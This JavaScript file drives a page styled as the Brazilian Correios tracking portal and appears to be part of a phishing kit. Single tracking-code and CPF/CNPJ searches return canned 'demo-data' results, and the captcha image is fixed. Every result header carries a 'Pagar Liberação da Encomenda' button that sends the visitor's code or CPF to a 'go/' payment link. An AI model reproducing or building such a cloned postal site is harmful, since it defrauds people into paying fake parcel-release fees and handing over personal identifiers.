import * as alerta from "./alerta.js";
import * as forms from "./forms.js";
import * as CodigoObjeto from "./rastroGeral.js";
import * as rastroUnico from "./rastroUnico.js";
import * as rastroMulti from "./rastroMulti.js";
import * as botoes from "./botoes.js";
import * as modal from "./modal.js";
import { buscarRastreamento } from "./demo-data.js";

console.log('index.js carregado com sucesso');
console.log('Módulos importados:', { alerta, forms, CodigoObjeto, rastroUnico, rastroMulti, botoes, modal });

const limparCodigoObjeto = (valor) => {
  return String(valor || "")
    .toUpperCase()
    .replace(new RegExp("[-,;. ]", "g"), "")
    .replace(/[^A-Z0-9]/g, "");
};

const validarcampoObjeto = async () => {
  const input_objeto = document.getElementById("objeto");
  const objetoLimpo = input_objeto.value.replace(
    new RegExp("[-,;. ]", "g"),
    ""
  );

  if (
    (isNaN(objetoLimpo[0]) &&
      objetoLimpo.length >= 13 &&
      objetoLimpo.length % 13 === 0) ||
    (!isNaN(objetoLimpo[0]) &&
      (objetoLimpo.length === 11 || objetoLimpo.length === 14))
  ) {
    const retorno = CodigoObjeto.validarCodigoObjeto(objetoLimpo);
    forms.setValidade(input_objeto, retorno.mensagem);
  }

  if (
    !isNaN(objetoLimpo[0]) &&
    (objetoLimpo.length === 12 || objetoLimpo.length === 13)
  ) {
    forms.setValidade(input_objeto, "");
  }
  if (!isNaN(objetoLimpo[0]) && objetoLimpo.length > 14) {
    forms.setValidade(
      input_objeto,
      "Favor informar de 1 a 20 códigos de objetos ou um CPF ou um CNPJ válido"
    );
  }
};
const validarcampoCaptcha = () => {
  const input_captcha = document.getElementById("captcha");
  const captcha = input_captcha.value;
  forms.setValidade(input_captcha, "");
  if (!captcha.length) {
    forms.setValidade(input_captcha, "Preencha o campo captcha");
    return false;
  }
  return true;
};
const formatoApresentacaoCodigoObjeto = (objeto) => {
  return `${objeto.substr(0, 2)} ${objeto.substr(2, 3)} ${objeto.substr(
    5,
    3
  )} ${objeto.substr(8, 3)} ${objeto.substr(-2)}`;
};
const cabecalhoRastro = (objeto) => {
  // Ícone do cabeçalho - logo dos Correios
  let icone = './images/logonovo.png';
  
  return `
        <div id="cabecalho-rastro" class="d-flex justify-content-between align-items-center">
            <ul class="cabecalho-rastro">                
                <div class="arrow-dashed justify-content-start">
                	<div class="circle">
                		<img class="circle-logo" src="${icone}" width="35px" height="35px">
                	</div>
                </div>
                <div class="cabecalho-content">
                    <p class="text text-content">${objeto.tipoPostal.categoria}</p>                    	
                    <div class="cabecalho-pay noPrint">
                      <a href="go/?cpf=${objeto.codObjeto}" class="btn btn-primary btn-pagar-taxa-aduaneira-inline" data-cod-objeto="${objeto.codObjeto}" id="cta-pagar-liberacao">
                        <i class="fa fa-credit-card" aria-hidden="true"></i> Pagar Liberação da Encomenda
                      </a>
                    </div>
                </div>                                                
            </ul>        
			<div class="share-bar noPrint" style="margin-left:auto;">
				<a title="Compartilhar" class="btn btn-light" data-objeto="${objeto.codObjeto}">
					<i class="fa fa-share-alt" aria-hidden="true"></i>
				</a>
			</div>
		</div>		
    `;
};
const rastroUnicoComVerMais = (objeto, cabPrevisao = "N") => {
  const cabecalho = cabecalhoRastro(objeto);
  const ul = rastroUnico.ul(objeto);
  //ver mais
  const ulVerMais = rastroUnico.verMais(objeto);
  let html = "";
  if (ulVerMais === "") {
    html = `
			${cabPrevisao === "S" ? cabecalho : ""}
			${ul}
		`;
  } else {
    html = `
			<div id="ver-mais" style="display: block;">
				${cabPrevisao === "S" ? cabecalho : ""}
				${ulVerMais}
				
			</div>
			<div id="ver-rastro-unico" style="display: none;">
				${cabPrevisao === "S" ? cabecalho : ""}
				${ul}
			</div>
		`;
  }
  return { html: html, temVerMais: ulVerMais !== "" };
};
const busca = async () => {
  console.log('Função busca() iniciada');
  
  const input_objeto = document.getElementById("objeto");
  const captcha = document.getElementById("captcha");
  
  console.log('Input objeto:', input_objeto.value);
  console.log('Captcha:', captcha.value);
  
  const objetoNormalizado = limparCodigoObjeto(input_objeto.value);
  input_objeto.value = objetoNormalizado;
  
  console.log('Objeto normalizado:', objetoNormalizado);
  
  const retorno = CodigoObjeto.validarCodigoObjeto(objetoNormalizado);
  
  console.log('Retorno validação:', retorno);
  
  if (retorno.erro) {
    forms.setValidade(input_objeto, retorno.mensagem);
    return false;
  }
  forms.setValidade(input_objeto, "");
  let objetos = retorno["objetosLimpos"];

  console.log('Objetos limpos:', objetos);
  console.log('Tamanho:', objetos.length);

  if (objetos.length === 13) {
    console.log('Entrando no bloco de 13 caracteres (código de rastreamento)');
    try {
      //Validar Captcha
      if (!validarcampoCaptcha()) {
        console.log('Captcha inválido');
        return false;
      }
      
      console.log('Captcha válido, iniciando busca...');
      alerta.abre("Buscando...");
      document.getElementById("tabs-rastreamento").innerHTML = "";
      
      console.log('Chamando buscarRastreamento...');
      // Usa dados de demonstração ao invés de fazer requisição real
      const r = await buscarRastreamento(objetos, captcha.value);
      
      console.log('Resultado da busca:', r);
      
      objetoUnico(r);
      atribuiClickShare();
      refreshCaptcha();
    } catch (err) {
      console.error('Erro na busca:', err);
      alerta.abre(err.message, 10, "OK");
    }
  } else {
    //CPF e ou CNPJ - busca diretamente no resultado.php
    if (objetos.length === 11 || objetos.length === 14) {
      console.log('Entrando no bloco de CPF/CNPJ (11 ou 14 dígitos)');
      try {
        //Validar Captcha
        if (!validarcampoCaptcha()) {
          console.log('Captcha inválido');
          return false;
        }
        
        console.log('Captcha válido, iniciando busca...');
        alerta.abre("Buscando...");
        document.getElementById("tabs-rastreamento").innerHTML = "";
        
        console.log('Chamando buscarRastreamento...');
        const r = await buscarRastreamento(objetos, captcha.value);
        
        console.log('Resultado da busca:', r);
        
        objetoUnico(r);
        atribuiClickShare();
        refreshCaptcha();
      } catch (err) {
        console.error('Erro na busca:', err);
        alerta.abre(err.message, 10, "OK");
      }
    } else {
      try {
        //Validar Captcha
        if (!validarcampoCaptcha()) {
          return false;
        }
        alerta.abre("Buscando...");
        const res = await fetch(
          `rastroMulti.php?objeto=${objetos}&captcha=${captcha.value}`
        );
        const r = await res.json();
        if (r.erro) {
          if (r.mensagem === "Captcha inválido") {
            alerta.fecha();
            forms.setValidade(captcha, r.mensagem);
          } else {
            alerta.abre(r.mensagem, 10, "OK");
          }
          refreshCaptcha();
          return;
        }
        document.getElementById("trilha").innerHTML = `
					<a>Portal Correios</a>
					<a>Rastreamento</a>`;

        document.getElementById(
          "titulo-pagina"
        ).innerHTML = `<h3 style='text-align: justify;'>Rastreamento</h3>
					<div class="print-bar noPrint">						
						<a id="print"    href='javascript:window.print()'><i  class="fa fa-print fa-lg disabled" aria-hidden="true"></i></a>
					</div>
				`;
        const tabsRastreamento = document.querySelector("#tabs-rastreamento");
        tabsRastreamento.innerHTML = rastroMulti.render(r, "tabs2");
        tabsRastreamento.display = "block";
        document.getElementById("objeto").value = "";
        $("#multirastro-tab a").on("click", function (e) {
          e.preventDefault();
          if (
            !!document.getElementById("em-transito") &&
            !!document.getElementById("entregue")
          ) {
            $(this).tab("show");
          }
        });
        const links = document.querySelectorAll("table div.objeto-info a");
        for (let i = 0; i < links.length; ++i) {
          links[i].addEventListener("click", mostrarDetalhes);
        }
        atribuiClickShare();
        alerta.fecha();
      } catch (err) {
        alerta.abre(err.message, 10, "OK");
      }
      refreshCaptcha();
    }
  }
};
const atribuiClickShare = () => {
  const btns = document.querySelectorAll("a[title='Compartilhar']");
  btns.forEach((btn) => {
    btn.addEventListener("click", (e) => {
      showButtons(e);
    });
  });
};
const showButtons = (ev) => {
  const divDestino = document.getElementById("msharebuttons");
  const codigoGarregado = divDestino.dataset.codigo;
  const section = divDestino.closest("section");
  const link = ev.target;
  const codigo = link.closest("a").dataset.objeto;
  if (codigo !== codigoGarregado) {
    divDestino.innerHTML = "";
    const shareUrl = `${window.location.origin}/app/index.php?objetos=${codigo}`;
    const html = `
		<a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&title=Detalhes do rastreamento"><i class="fa fa-facebook-official fa-lg" aria-hidden="true"></i></a>
		<a target="_blank" href="https://wa.me/?text=${encodeURIComponent(shareUrl)}"><i  class="fa fa-whatsapp fa-lg" aria-hidden="true"></i></a>
		<a target="_blank" href="https://twitter.com/share?url=${encodeURIComponent(shareUrl)}&text=Detalhes do meu rastreamento"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a>
	`;
    divDestino.innerHTML = html;
  }
  modal.abre("modalshare");
  const botaoOffSet = link.getBoundingClientRect();
  const sectionOffSet = section.getBoundingClientRect();
  const larguraJanela = window.innerWidth;
  const posicaoHorizontal = sectionOffSet.left + sectionOffSet.width;
  section.style.position = "absolute";
  section.style.left =
    botaoOffSet.left + (botaoOffSet.width - sectionOffSet.width) / 2 + "px";
  section.style.top = botaoOffSet.top + botaoOffSet.height + 11 + "px";
  divDestino.classList.remove("vertical");
  if (posicaoHorizontal > larguraJanela) {
    divDestino.classList.add("vertical");
  }
};
const mostrarDetalhes = async (evento) => {
  evento.preventDefault();
  const codObjeto = evento.currentTarget.dataset.codobjeto;
  //console.log(codObjeto);
  const td = document.getElementById(codObjeto);
  if (td === null) return false;
  let iconeClasses = td.querySelector("a>i").classList;
  const divRastrosUnico = td.querySelector('div[data-name="rastrosUnicos"]');
  const divsBotoes = td.querySelectorAll('div[data-name="barra-botoes"]');

  if (iconeClasses.contains("fa-plus-circle")) {
    fecharTodasDivs();
    iconeClasses.replace("fa-plus-circle", "fa-minus-circle");
  } else {
    divRastrosUnico.classList.toggle("esconde");
    document
      .querySelectorAll(".barra-btns")
      .forEach((el) => el.classList.add("esconde"));
    iconeClasses.replace("fa-minus-circle", "fa-plus-circle");
    return;
  }
  if (!divRastrosUnico.innerHTML.trim().length) {
    if (!validarcampoCaptcha()) {
      iconeClasses.replace("fa-minus-circle", "fa-plus-circle");
      return false;
    }
    alerta.abre("Buscando...");
    const captcha = document.getElementById("captcha");
    const res = await fetch(
      `resultado.php?objeto=${codObjeto}&captcha=${captcha.value}&mqs=N`
    );
    const r = await res.json();
    if (r.erro) {
      iconeClasses.replace("fa-minus-circle", "fa-plus-circle");
      if (r.mensagem === "Captcha inválido") {
        forms.setValidade(captcha, r.mensagem);
      } else {
        alerta.abre(r.mensagem, 10, "OK");
      }
    } else {
      // carregar a div de resultado .

      const objetos = r;
      const cabecalho = cabecalhoRastro(objetos);
      const ul = rastroUnico.ul(objetos, "T");
      divRastrosUnico.innerHTML = `${cabecalho} ${ul}`;
      const btns = botoes.btnsNacRastroUnico(objetos);
      divsBotoes.forEach((el) => {
        el.innerHTML += btns;
      });
      // calcular e exibir somente objetos em transito.
      // if(objetoss.situacao !== 'E') {
      // 	if (divPrazoEntrega.innerHTML.trim().toString()==='Clique no "+" para exibir'.toString()) {
      // 		alerta.abre('Buscando a data de entrega...');
      // 		const dtPrevista = await verifyDataPrevista(objetoss);
      // 		if (dtPrevista !== '') {
      // 			const cabecalhoContent = divRastrosUnico.querySelector('.cabecalho-content');
      // 			const p = `<p class="text text-head">Previsão de Entrega: ${dtPrevista}</p>`;
      // 			cabecalhoContent.insertAdjacentHTML("afterbegin", p);
      // 			divPrazoEntrega.innerHTML = dtPrevista;
      // 		}else{
      // 			divPrazoEntrega.innerHTML = 'Informação indisponível';
      // 		}
      // 	}
      // }

      const botoesArEletronico =
        divsBotoes.querySelectorAll(".btn-arEletronico");
      botoesArEletronico.forEach((el) => {
        el.addEventListener("click", abrirArEletronico);
      });

      const btnsLocker = td.querySelectorAll(".btnLckIcon");
      eventShowLocker(codObjeto, btnsLocker);
    }
    refreshCaptcha();
    alerta.fecha();
  }
  divRastrosUnico.classList.toggle("esconde");

  divsBotoes.forEach((el) => {
    if (el.innerHTML.trim().length) {
      el.classList.toggle("esconde");
    }
  });
};
// data-permite-visualizar-ar-eltronico="false"
const abrirArEletronico = async (ev) => {
  const el = ev.target;
  const objetoPostal = el.dataset.objeto;
  const retorno = await verificaLogado();
  // if (
  //   retorno.logado &&
  //   "permiteVisualizarArEltronico" in el.dataset &&
  //   el.dataset.permiteVisualizarArEltronico === "true"
  // ) {
    window.open(`arEletronico/index.php?objeto=${objetoPostal}`, "_blank");
    return false;
  // }
  // if (retorno.logado) {
  //   modal.abre("modalNaoPermiteVisualizarArEletronico");
  //   return false;
  // }

  // modal.abre("modalAvisoRestricaoArEletronico");
  // return false;
};

const verificaLogado = async () => {
  const res = await fetch(`check_auth.php`);
  return await res.json();
};

const fecharTodasDivs = () => {
  document
    .querySelectorAll(".barra-btns")
    .forEach((el) => el.classList.add("esconde"));
  document
    .querySelectorAll(".rastrosUnicos")
    .forEach((el) => el.classList.add("esconde"));
  document
    .querySelectorAll("div.objeto-info a>i")
    .forEach((el) => el.classList.replace("fa-minus-circle", "fa-plus-circle"));
};
const refreshCaptcha = () => {
  const captcha_image = document.getElementById("captcha_image");
  const captcha = document.getElementById("captcha");
  captcha.value = "";
  
  // Mantém a imagem fixa
  captcha_image.src = "./a.PNG";
  
  return false;
};
const buscaRastroCpfCnpj = (function (cpfCnpj = "") {
  const module = {};

  module._html = async () => {
    try {
      alerta.abre("Buscando...");

      const res = await fetch(`rastrocpfcnpj.php?cpfcnpj=${cpfCnpj}`);
      //const res = await fetch(`teste.php?cpfcnpj=${cpfCnpj}`);
      const r = await res.json();
      if (r.erro) {
        alerta.abre(r.mensagem, 10, "OK");
      } else {
        alerta.fecha();
        document.getElementById("objeto").value = "";
        document.getElementById("trilha").innerHTML = `
			 <a>Portal Correios</a>
			 <a>Rastreamento</a>
			 <a>Meus Rastreamentos</a>
				`;
        //document.getElementById('titulo-pagina').innerHTML = `<h3 style='text-align: justify;'>Rastreamento</h3>`;
        document.getElementById(
          "titulo-pagina"
        ).innerHTML = `<h3 style='text-align: justify;'>Rastreamento</h3>
					<div class="print-bar noPrint">						
						<a id="print"    href='javascript:window.print()'><i  class="fa fa-print fa-lg disabled" aria-hidden="true"></i></a>
					</div>
				`;

        const keys = Object.keys(r);
        let html = "";

        const tabsRastreamento = document.querySelector("#tabs-rastreamento");
        //remove all elements into div tabsRastreamento
        while (tabsRastreamento.lastElementChild) {
          tabsRastreamento.removeChild(tabsRastreamento.lastElementChild);
        }
        const legenda = {
          html: function (lg) {
            return `
							<div class="barPrint">
								<span style="text-align: justify; font-size: 17px; color: #0071AD;" >${lg}</span>
							</div>
						`;
          },
        };
        for (const key of keys) {
          let rr = r[key];
          let id = `tab-${key}`;
          let multiObjetos = rastroMulti.render(rr, id);
          let lg = "";
          switch (key) {
            case "enviadoParaVoce":
              if (multiObjetos.length > 197) {
                lg = legenda.html("Enviado para você");
                const divParaVc = document.createElement("div");
                divParaVc.id = "divParaVc";
                divParaVc.innerHTML = `${lg}${multiObjetos}<br><br>`;
                tabsRastreamento.insertBefore(divParaVc, null);
                document.getElementById("divParaVc").display = "block";
              }
              break;
            case "enviadoPorVoce":
              if (multiObjetos.length > 197) {
                lg = legenda.html("Enviado por você");
                const divPorVc = document.createElement("div");
                divPorVc.id = "divPorVc";
                divPorVc.innerHTML = `${lg}${multiObjetos}<br><br>`;
                tabsRastreamento.insertBefore(divPorVc, null);
                document.getElementById("divPorVc").display = "block";
              }
              break;
            default:
          }
        }

        $("#multirastro-tab a").on("click", function (e) {
          e.preventDefault();
          if (
            !!document.getElementById("em-transito") &&
            !!document.getElementById("entregue")
          ) {
            $(this).tab("show");
          }
        });
        const links = document.querySelectorAll("table div.objeto-info a");
        for (let i = 0; i < links.length; ++i) {
          links[i].addEventListener("click", mostrarDetalhes);
        }
        atribuiClickShare();
      }
    } catch (err) {
      alerta.abre(err.message, 10);
    }
  };

  return {
    html: module._html,
  };
})();
const mudaVisaoRastroUnico = () => {
  document.querySelector("#ver-mais").style.display = "none";
  document.querySelector("#ver-rastro-unico").style.display = "block";
};
const imprimirRastroUnico = () => {
  const verMais = document.querySelectorAll("#ver-mais");
  if (verMais.length) {
    mudaVisaoRastroUnico();
  }
  window.print();
};
async function controladora() {
  try {
    const res = await fetch(`controle.php`);
    const r = await res.json(); //extract a JSON object from the response

    if (r.form_retorno === "rastreamento") {
      if (r.listaObjetos.length) {
        const obj = document.getElementById("objeto");
        obj.value = r.listaObjetos;
        //busca();
      }
    } else {
      if (r.logado) {
        buscaRastroCpfCnpj.html();
      }
    }
  } catch (err) {
    alerta.abre(err.message, 10, "OK");
  }
}
const objetoUnico = async (r) => {
  try {
    if (r.erro) {
      if (r.mensagem === "Captcha inválido") {
        alerta.fecha();
        const captcha = document.getElementById("captcha");
        forms.setValidade(captcha, r.mensagem);
      } else {
        alerta.abre(r.mensagem, 10, "OK");
      }
    } else {
      document.getElementById("objeto").value = "";
      //const objetoCorreio = JSON.parse(r).objetos[0];
      //const objetoCorreio = r.objetos[0];
      const objetoCorreio = r;
      const objetos = objetoCorreio.codObjeto;
      const rastroUn = rastroUnicoComVerMais(objetoCorreio, "S");
      //const botao = await btnsRastroUnico(objetoCorreio);
      const botaoInterNac = botoes.btnsIntRastroUnico(objetoCorreio);
      const botaoNac = botoes.btnsNacRastroUnico(objetoCorreio);

      const html = `
				${rastroUn.html}
				${botaoInterNac}
				${botaoNac}
			`;

      const tabsRastreamento = document.getElementById("tabs-rastreamento");
      tabsRastreamento.innerHTML = html; /*rastroUn.html;*/
      
      const tooltipTriggerList = [
        ...document.querySelectorAll('[data-bs-toggle="tooltip"]'),
      ];
      tooltipTriggerList.forEach(function (tooltipTriggerEl) {
        new bootstrap.Tooltip(tooltipTriggerEl, {
          fallbackPlacements: [], // Impede o Bootstrap de ajustar a posição
        });
      });

      if (rastroUn.temVerMais) {
        document
          .getElementById("a-ver-mais")
          .addEventListener("click", mudaVisaoRastroUnico);
      }
      const btns = document.querySelectorAll(".btnLckIcon");
      eventShowLocker(objetos, btns);

      document.getElementById(
        "titulo-pagina"
      ).innerHTML = `<h3 style='text-align: justify;'>${formatoApresentacaoCodigoObjeto(
        objetos
      )}</h3>
					<div class="print-bar noPrint">
						<a id="print" href="#"><i  class="fa fa-print fa-lg" aria-hidden="true"></i></a>
					</div>				
				`;
      document.getElementById("print").addEventListener("click", () => {
        imprimirRastroUnico();
      });
      document.getElementById("trilha").innerHTML = `
				<a>Portal Correios</a>
				<a>Rastreamento</a>
				<a>${objetos}</a>
			`;

      const botoesArEletronico = document.querySelectorAll(".btn-arEletronico");
      botoesArEletronico.forEach((el) => {
        el.addEventListener("click", abrirArEletronico);
      });
      // if(objetoCorreio.situacao !== 'E') {
      // 	const dtPrevista = await verifyDataPrevista(objetoCorreio);
      // 	if (dtPrevista !== '') {
      // 		const p = `<p class="text text-head">Previsão de Entrega: ${dtPrevista}</p>`;
      // 		const cabecalhosContent = document.querySelectorAll('.cabecalho-content');
      // 		cabecalhosContent.forEach(cabecalhoContent=>{
      // 			cabecalhoContent.insertAdjacentHTML("afterbegin", p);
      // 		})
      // 	}
      // }
      alerta.fecha();
    }
  } catch (err) {
    alerta.abre(err.message, 10, "OK");
  }
};

const mostrarQrLock = async (objeto) => {
  try {
    const modal1 = document.getElementById("m1");
    if (!modal1.innerHTML.length || modal1.dataset.objeto !== objeto) {
      const res = await fetch(`qrLocker.php?objeto=${objeto}`);
      const r = await res.json(); //extract a JSON object from the response

      if (r.erro) {
        alerta.abre(r.mensagem, 10, "OK");
        return;
      }

      let iframe = document.getElementById("ifLocker");
      if (!modal1.getElementsByTagName("iframe").length) {
        iframe = document.createElement("iframe");
        iframe.className = "lckrIframe";
        iframe.id = "ifLocker";
      }
      iframe.src = r.shortLinkQRCode;
      modal1.appendChild(iframe);
      modal1.dataset.objeto = objeto;
    }
    modal.abre("m1");
  } catch (err) {
    alerta.abre(err.message, 10);
  }
};
const eventShowLocker = (objetos, btns) => {
  //const btns = document.querySelectorAll('.btnLckIcon');
  if (btns.length) {
    btns.forEach(function (elem) {
      elem.addEventListener(
        "click",
        () => {
          mostrarQrLock(objetos);
        },
        false
      );
    });
  }
};
$(document).ready(function () {
  console.log('jQuery ready executado');
  
  $(window).keydown(function (event) {
    if (event.keyCode === 13) {
      console.log('Enter pressionado');
      busca();
      return false;
    }
  });
  
  const btnPesquisar = document.getElementById("b-pesquisar");
  console.log('Botão b-pesquisar:', btnPesquisar);
  
  if (btnPesquisar) {
    btnPesquisar.addEventListener(
      "click",
      () => {
        console.log('Botão clicado!');
        busca();
      },
      false
    );
  } else {
    console.error('Botão b-pesquisar não encontrado!');
  }
  document.getElementById("objeto").addEventListener(
    "input",
    () => {
      validarcampoObjeto();
    },
    false
  );
  document.getElementById("captcha_refresh_btn").addEventListener(
    "click",
    () => {
      refreshCaptcha();
    },
    false
  );
  document
    .getElementById("b-invoked")
    .addEventListener("click", controladora());
  document.getElementById("objeto").addEventListener(
    "focusout",
    (ev) => {
      let el = ev.target;
      el.value = el.value.trim(); // Aplica o trim ao valor do input
    },
    false
  );
  document
    .querySelector("#btnFecharModalAvisoRestricaoArEletronico")
    .addEventListener("click", () => {
      modal.fecha("modalAvisoRestricaoArEletronico");
    });
  document
    .querySelector("#btnFecharModalNaoPermiteVisualizarArEletronico")
    .addEventListener("click", () => {
      modal.fecha("modalNaoPermiteVisualizarArEletronico");
    });
  document
    .querySelector("#btnAutenticarModalAvisoRestricaoArEletronico")
    .addEventListener("click", () => {
      window.location.href = "core/seguranca/entrar.php";
    });
});
